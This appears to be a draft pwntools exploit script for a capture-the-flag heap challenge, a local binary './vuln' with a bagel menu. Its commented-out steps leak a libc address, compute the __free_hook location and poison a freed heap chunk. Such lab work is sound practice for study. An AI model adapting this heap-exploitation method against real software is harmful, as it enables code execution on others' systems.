from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

io = gdb.debug("./vuln", "c")
# for i in range(8):
#     io.sendlineafter(b"(c)", b"c")
#     io.sendlineafter(b"Where should I store your bagel?\n", str(i).encode())

# for i in reversed(range(8)):
#     io.sendlineafter(b"(c)", b"e")
#     io.sendlineafter(b"Which bagel do you want to eat?\n", str(i).encode())


# io.sendlineafter(b"(c)", b"v")
# io.sendlineafter(b"Which bagel do you want to view?\n", b"0")
# libc_base = int.from_bytes(io.recv(6), "little") - 0x3EBCA0
# print(f"{libc_base = :#x}")
# free_hook = libc_base + 0x3ED8E8
# print(f"{free_hook = :#x}")

# context.log_level = 'debug'

# io.sendlineafter(b"(c)", b"d")
# io.sendlineafter(b"Which bagel do you want to decorate?\n", b"1")
# io.sendlineafter(b"What do you want to write on the bagel?\n", p64(0xdeadbeef))

# io.sendlineafter(b"(c)", b"c")
# io.sendlineafter(b"Where should I store your bagel?\n", b"0")

io.interactive()
